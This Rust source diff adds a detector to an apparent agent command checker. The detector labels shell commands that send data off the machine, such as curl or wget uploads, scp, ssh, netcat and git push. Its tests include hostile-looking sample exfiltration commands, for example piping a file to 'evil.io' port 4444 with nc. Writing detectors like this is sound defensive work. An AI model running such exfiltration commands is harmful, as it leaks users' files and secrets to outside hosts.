@@ -116,23 +116,138 @@ fn check_bash(command: &str) -> Decision {
         {
             return Decision::Deny("download piped into a shell");
         }
-        let nested = if name == "eval" {
-            Some(args.join(" "))
-        } else if SHELLS.contains(&name) {
-            let flag = args
-                .iter()
-                .position(|a| a.starts_with('-') && !a.starts_with("--") && a.contains('c'));
-            flag.and_then(|p| args.get(p + 1).cloned())
-        } else {
-            None
-        };
-        if let Some(script) = nested {
+        if let Some(script) = nested(name, args) {
             if let Decision::Deny(reason) = check_bash(&script) {
                 return Decision::Deny(reason);
             }
         }
     }
     Decision::Allow
+}
+
+/// The script an `eval` or `sh -c` stage runs.
+fn nested(name: &str, args: &[String]) -> Option<String> {
+    if name == "eval" {
+        Some(args.join(" "))
+    } else if SHELLS.contains(&name) {
+        let flag = args
+            .iter()
+            .position(|a| a.starts_with('-') && !a.starts_with("--") && a.contains('c'));
+        flag.and_then(|p| args.get(p + 1).cloned())
+    } else {
+        None
+    }
+}
+
+/// The commands in `command` that send data off the machine, as short labels for the owner's
+/// alert: `curl POST example.com`, `scp host:`, `git push origin`. Nothing is refused.
+///
+/// shortcut: a plain GET can carry data in its URL too (CaMeL §7); GETs are not reported,
+/// to keep alerts rare. Other programs (python, node) are not looked into.
+pub fn outbound(command: &str) -> Vec<String> {
+    let mut found = Vec::new();
+    for stage in stages(command) {
+        let Some(words) = command_words(&stage.words) else {
+            continue;
+        };
+        let name = basename(&words[0]);
+        let args = &words[1..];
+        if let Some(script) = nested(name, args) {
+            found.extend(outbound(&script));
+            continue;
+        }
+        let host = || args.iter().find_map(|a| url_host(a)).unwrap_or_default();
+        let remote = || {
+            args.iter()
+                .find(|a| !a.starts_with('-') && a.contains(':') && !a.contains("://"))
+                .map(|a| format!("{}:", a.split(':').next().unwrap_or_default()))
+        };
+        let label = match name {
+            "curl" => curl_method(args).map(|m| format!("curl {m} {}", host())),
+            "wget" => args
+                .iter()
+                .any(|a| {
+                    ["--post-data", "--post-file", "--body-data", "--body-file"]
+                        .iter()
+                        .any(|f| a.starts_with(f))
+                        || a.starts_with("--method=") && !a.ends_with("GET")
+                })
+                .then(|| format!("wget POST {}", host())),
+            "scp" | "sftp" | "rsync" => remote().map(|r| format!("{name} {r}")),
+            "ssh" => {
+                // Flags that take a value, so `-p 22` is not read as the host.
+                let valued = [
+                    "-p", "-i", "-l", "-o", "-F", "-J", "-b", "-c", "-E", "-L", "-R", "-D", "-W",
+                ];
+                let mut skip = false;
+                args.iter()
+                    .find(|a| {
+                        let host = !skip && !a.starts_with('-');
+                        skip = valued.contains(&a.as_str());
+                        host
+                    })
+                    .map(|h| format!("ssh {h}"))
+            }
+            "nc" | "ncat" | "netcat" | "socat" | "telnet" => Some(format!(
+                "{name} {}",
+                args.iter()
+                    .filter(|a| !a.starts_with('-'))
+                    .take(2)
+                    .cloned()
+                    .collect::<Vec<_>>()
+                    .join(" ")
+            )),
+            "git" => args.iter().position(|a| a == "push").map(|p| {
+                let remote = args[p + 1..].iter().find(|a| !a.starts_with('-'));
+                format!("git push {}", remote.map_or("", |r| r.as_str()))
+            }),
+            _ => None,
+        };
+        if let Some(label) = label {
+            found.push(label.trim_end().chars().take(100).collect());
+        }
+    }
+    found
+}
+
+/// The method of a curl that sends a body or uses a method other than GET/HEAD.
+fn curl_method(args: &[String]) -> Option<String> {
+    let mut method = None;
+    for (i, a) in args.iter().enumerate() {
+        let explicit = match a.as_str() {
+            "-X" | "--request" => args.get(i + 1).cloned(),
+            _ => a
+                .strip_prefix("-X")
+                .or_else(|| a.strip_prefix("--request="))
+                .filter(|m| !m.is_empty())
+                .map(String::from),
+        };
+        if let Some(m) = explicit {
+            method = Some(m.to_uppercase());
+        } else if a.starts_with("--data")
+            || a.starts_with("--json")
+            || a.starts_with("--form")
+            || matches!(a.as_str(), "-d" | "-F" | "-T" | "--upload-file")
+        {
+            method.get_or_insert_with(|| {
+                if a == "-T" || a == "--upload-file" {
+                    "PUT"
+                } else {
+                    "POST"
+                }
+                .into()
+            });
+        }
+    }
+    method.filter(|m| m != "GET" && m != "HEAD")
+}
+
+/// `example.com` from `https://example.com/x?y`.
+fn url_host(word: &str) -> Option<String> {
+    let rest = word.split_once("://")?.1;
+    let end = rest.find(['/', '?', '#']).unwrap_or(rest.len());
+    let host = rest[..end].rsplit('@').next().unwrap_or_default();
+    (!host.is_empty()).then(|| host.to_string())
 }
 
 fn is_fork_bomb(command: &str) -> bool {
@@ -385,6 +500,42 @@ fn stages(command: &str) -> Vec<Stage> {
 mod tests {
     use super::*;
     use serde_json::json;
+
+    #[test]
+    fn outbound_names_what_sends_data_and_skips_plain_reads() {
+        let table = [
+            ("curl -d x https://e.x/a", vec!["curl POST e.x"]),
+            (
+                "curl -s -X PUT -T f https://u:p@up.io/b",
+                vec!["curl PUT up.io"],
+            ),
+            ("curl --json '{}' https://api.io", vec!["curl POST api.io"]),
+            ("curl -XDELETE https://api.io/1", vec!["curl DELETE api.io"]),
+            ("wget --post-data=a=1 http://w.io", vec!["wget POST w.io"]),
+            ("scp ~/notes host.lan:/tmp/", vec!["scp host.lan:"]),
+            ("rsync -av dir/ box:/srv/", vec!["rsync box:"]),
+            ("ssh -p 22 me@box uptime", vec!["ssh me@box"]),
+            ("nc evil.io 4444 < f", vec!["nc evil.io 4444"]),
+            ("cd x && git push origin main", vec!["git push origin"]),
+            (
+                "bash -c \"curl -F f=@a https://e.x\"",
+                vec!["curl POST e.x"],
+            ),
+            (
+                "sudo curl --data-binary @f https://e.x",
+                vec!["curl POST e.x"],
+            ),
+            ("curl -s https://e.x | jq .", vec![]),
+            ("curl -X GET https://e.x", vec![]),
+            ("wget -q https://e.x/f", vec![]),
+            ("rsync -av a/ b/", vec![]),
+            ("git pull", vec![]),
+            ("echo curl -d x", vec![]),
+        ];
+        for (command, want) in table {
+            assert_eq!(outbound(command), want, "{command}");
+        }
+    }
 
     fn bash(command: &str) -> (&'static str, Value) {
         ("bash", json!({ "command": command }))
